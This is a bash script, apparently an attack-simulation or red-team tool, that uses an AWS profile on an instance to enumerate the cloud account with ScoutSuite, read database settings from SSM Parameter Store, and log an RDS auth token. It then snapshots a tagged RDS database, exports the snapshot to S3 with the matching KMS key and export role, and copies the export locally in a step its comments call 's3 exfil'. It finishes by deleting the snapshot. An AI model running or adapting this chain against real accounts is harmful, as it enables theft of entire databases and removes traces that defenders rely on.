#!/bin/bash

SCRIPTNAME=instance2rds
LOGFILE=/tmp/$SCRIPTNAME.log
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}
MAXLOG=2
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true

log "Checking for aws cli..."
while ! which aws > /dev/null; do
    log "aws cli not found or not ready - waiting"
    sleep 120
done
log "aws path: $(which aws)"

REGION=region
ENVIRONMENT=target
DEPLOYMENT=deployment
PROFILE="instance"
opts="--no-cli-pager"

log "Downloading jq..."
curl -LJ -o /usr/bin/jq https://github.com/jqlang/jq/releases/download/jq-1.7/jq-linux-amd64 && chmod 755 /usr/bin/jq

#######################
# aws cred setup
#######################

log "public ip: $(curl -s https://icanhazip.com)"

log "available profiles: $(aws configure list-profiles)"

while ! aws configure list-profiles | grep $PROFILE; do
    log "missing profile: $PROFILE"
    log "aws dir listing: $(ls -ltra ~/.aws)"
    log "waiting for profile..."
    sleep 60
done

log "Running: aws sts get-caller-identity --profile=$PROFILE"
aws sts get-caller-identity --profile=$PROFILE $opts >> $LOGFILE 2>&1

log "Getting current account number..."
AWS_ACCOUNT_NUMBER=$(aws sts get-caller-identity --profile=$PROFILE $opts | jq -r '.Account')
log "Account Number: $AWS_ACCOUNT_NUMBER"

#######################
# cloud enumeration
#######################
scout aws --profile=$PROFILE --report-dir /root/scout-report --no-browser

#######################
# rds exfil snapshot and export
#######################

# get rds details from ssm parameter store
log "Getting db connect token..."
DBHOST="$(aws ssm get-parameter --name="db_host" --with-decryption --profile=$PROFILE --region=$REGION $opts| jq -r '.Parameter.Value' | cut -d ":" -f 1)"
DBUSER="$(aws ssm get-parameter --name="db_username" --with-decryption --profile=$PROFILE --region=$REGION $opts | jq -r '.Parameter.Value')"
# DBPASS="$(aws ssm get-parameter --name="db_password" --with-decryption --profile=$PROFILE --region=$REGION $opts | jq -r '.Parameter.Value')"
DBPORT="$(aws ssm get-parameter --name="db_port" --with-decryption --profile=$PROFILE --region=$REGION $opts | jq -r '.Parameter.Value')"
DBREGION="$(aws ssm get-parameter --name="db_region" --with-decryption --profile=$PROFILE --region=$REGION $opts | jq -r '.Parameter.Value')"
cat <<-EOF >> $LOGFILE
DBHOST=$DBHOST
DBUSER=$DBUSER
DBPORT=$DBPORT
DBREGION=$DBREGION
EOF

# get dynamic iam based auth token
log "Getting db connect token..."
TOKEN="$(aws rds generate-db-auth-token --profile=$PROFILE --hostname $DBHOST --port $DBPORT --region $REGION --username $DBUSER $opts)"
log "TOKEN: $TOKEN"

log "Getting DbInstanceIdentifier..."
DB_INSTANCE_ID=$(aws rds describe-db-instances \
  --profile=$PROFILE \
  --region=$REGION  \
  $opts \
  | jq -r ".DBInstances[] | select(.TagList[] | (.Key == \"environment\" and .Value == \"$ENVIRONMENT\")) | select(.TagList[] | (.Key == \"deployment\" and .Value == \"$DEPLOYMENT\")) | .DBInstanceIdentifier")
log "DbInstanceIdentifier: $DB_INSTANCE_ID"

log "Creating rds snapshot..."
NOW_DATE=$(date '+%Y-%m-%d-%H-%M-%S')
CURRENT_DATE=$(date +%Y-%m-%d)
DB_SNAPSHOT_ARN=$(aws rds create-db-snapshot \
    --profile=$PROFILE  \
    --region=$REGION  \
    $opts   \
    --db-instance-identifier $DB_INSTANCE_ID \
    --db-snapshot-identifier snapshot-$ENVIRONMENT-$DEPLOYMENT-$NOW_DATE \
    --tags Key=environment,Value=$ENVIRONMENT Key=deployment,Value=$DEPLOYMENT \
    --query 'DBSnapshot.DBSnapshotArn' \
    --output text)
log "DB Snapshot ARN: $DB_SNAPSHOT_ARN"

log "Waiting for rds snapshot to complete..."
aws rds wait db-snapshot-completed  \
    --profile=$PROFILE  \
    --region=$REGION  \
    --db-snapshot-identifier $DB_SNAPSHOT_ARN  >> $LOGFILE 2>&1
log "RDS snapshot complete."

log "Obtaining the KMS key id..."
for keyId in $(aws kms list-keys --query 'Keys[].KeyId' --profile=$PROFILE --region=$REGION --output json $opts| jq -r '.[]'); do
  echo $keyId
  keyinfo=$(aws kms describe-key --key-id "$keyId" --query 'KeyMetadata' --output json --profile=$PROFILE --region=$REGION $opts 2> /dev/null)
  echo $keyinfo
  enabled=$(echo "$keyinfo" | jq -r '.Enabled')
  echo $enabled
  if [ "$enabled" = "true" ]; then
    TAG_VALUE=$(aws kms list-resource-tags --key-id "$keyId" --profile=$PROFILE --region=$REGION $opts 2> /dev/null | jq -r ".Tags[] | select(.TagKey==\"Name\" and .TagValue==\"db-kms-key-$ENVIRONMENT-$DEPLOYMENT\") | .TagValue")
    echo "Tag: $TAG_VALUE"
    if [ "$TAG_VALUE" == "db-kms-key-$ENVIRONMENT-$DEPLOYMENT" ]; then
      echo "Found: $keyId"
      KMS_KEY_ID=$keyId
      break
    fi
  fi
done
log "KMS Key Id: $KMS_KEY_ID"

log "Obtaining rds export role..."
RDS_EXPORT_ROLE_ARN=$(aws iam list-roles --profile=$PROFILE --region=$REGION $opts | jq -r ".Roles[] | select(.RoleName==\"rds-s3-export-role-$ENVIRONMENT-$DEPLOYMENT\") | .Arn")
log "RDS export role: $RDS_EXPORT_ROLE_ARN"

log "Exporting rds snapshot to s3..."
EXPORT_TASK_IDENTIFIER="snapshot-export-$ENVIRONMENT-$DEPLOYMENT-$NOW_DATE"
EXPORT_TASK_ARN=$(aws rds start-export-task \
    --profile=$PROFILE  \
    --region=$REGION  \
    $opts   \
    --export-task-identifier $EXPORT_TASK_IDENTIFIER \
    --source-arn $DB_SNAPSHOT_ARN \
    --s3-bucket-name db-ec2-backup-$ENVIRONMENT-$DEPLOYMENT \
    --s3-prefix "$CURRENT_DATE" \
    --iam-role-arn $RDS_EXPORT_ROLE_ARN \
    --kms-key-id=$KMS_KEY_ID | jq -r '.ExportTasks[0].SourceArn') 
log "Export task arn: $EXPORT_TASK_ARN"
log "Export task identifier: $EXPORT_TASK_IDENTIFIER"

log "Getting snapshot export task status..."
aws rds describe-export-tasks \
    --profile=$PROFILE  \
    --region=$REGION  \
    $opts   \
    --export-task-identifier $EXPORT_TASK_IDENTIFIER \
    --source-arn $DB_SNAPSHOT_ARN >> $LOGFILE 2>&1

while true; do
    STATUS=$(aws rds describe-export-tasks \
        --profile=$PROFILE \
        --region=$REGION \
        $opts \
        --export-task-identifier $EXPORT_TASK_IDENTIFIER \
        --source-arn $DB_SNAPSHOT_ARN \
        --query 'ExportTasks[0].Status' \
        --output text)
    
    if [ "$STATUS" == "COMPLETE" ]; then
        log "Export task completed successfully."
        break
    elif [ "$STATUS" == "FAILED" ]; then
        log "Export task failed."
        exit 1
    elif [ "$STATUS" == "None" ]; then
        log "Export task failed or does not exist."
        exit 1
    elif [ "$STATUS" == "" ]; then
        log "Export task failed or does not exist."
        exit 1
    else
        log "Export task is still in progress. Current status: $STATUS"
        sleep 60
    fi
done

log "Starting s3 exfil for s3://db-ec2-backup-$ENVIRONMENT-$DEPLOYMENT/$CURRENT_DATE/$EXPORT_TASK_IDENTIFIER => /tmp/$EXPORT_TASK_IDENTIFIER"
mkdir /tmp/$EXPORT_TASK_IDENTIFIER
aws s3 cp \
    --profile=$PROFILE  \
    --region=$REGION \
    $opts   \
    s3://db-ec2-backup-$ENVIRONMENT-$DEPLOYMENT/$CURRENT_DATE/$EXPORT_TASK_IDENTIFIER/ \
    /tmp/$EXPORT_TASK_IDENTIFIER \
    --recursive >> $LOGFILE 2>&1

log "Cleaning up snapshot..."
DB_SNAPSHOT_ID=$(echo "$DB_SNAPSHOT_ARN" | cut -d: -f7)
aws rds delete-db-snapshot \
    --profile=$PROFILE  \
    --region=$REGION \
    $opts  \
    --db-snapshot-identifier $DB_SNAPSHOT_ID >> $LOGFILE 2>&1

log "Done"